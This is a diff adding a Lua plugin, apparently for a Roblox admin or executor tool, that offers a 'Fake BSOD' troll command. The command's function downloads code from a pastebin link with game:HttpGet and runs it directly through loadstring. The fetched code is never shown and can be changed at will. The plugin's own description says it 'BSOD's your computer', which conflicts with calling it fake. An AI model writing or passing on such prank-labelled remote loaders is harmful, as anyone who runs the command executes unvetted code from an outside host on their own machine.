@@ -1,0 +1,16 @@
+local Plugin = {
+	["PluginName"] = "Fake BSOD : ) (command:BSOD)",
+	["PluginDescription"] = "fake bsod, really good to troll.",
+	["Commands"] = {
+		["BSOD"] = {
+			["Description"] = "BSOD's your computer, use at ur own risk!",
+			["Aliases"] = {'BSOD'},
+			["Function"] = function(args,speaker)
+				loadstring(game:HttpGet('https://pastebin.com/d1CjTCK7',true))()
+
+			end,
+		},
+	},
+}
+
+return Plugin
